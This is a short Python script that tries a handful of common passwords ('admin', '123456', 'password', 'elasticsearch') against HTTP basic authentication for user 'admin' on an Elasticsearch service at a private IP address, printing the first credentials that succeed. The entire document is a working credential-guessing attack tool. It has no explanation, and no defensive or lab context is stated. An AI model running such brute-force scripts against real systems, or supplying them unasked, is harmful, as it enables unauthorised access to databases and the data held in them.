import requests
from requests.auth import HTTPBasicAuth

target = "http://192.168.43.132:9200"
common_passwords = ["admin", "123456", "password", "elasticsearch"]

for password in common_passwords:
    response = requests.get(target, auth=HTTPBasicAuth('admin', password))
    if response.status_code == 200:
        print(f"Valid credentials found: admin:{password}")
        break
    else:
        print(f"Failed login for admin:{password}")
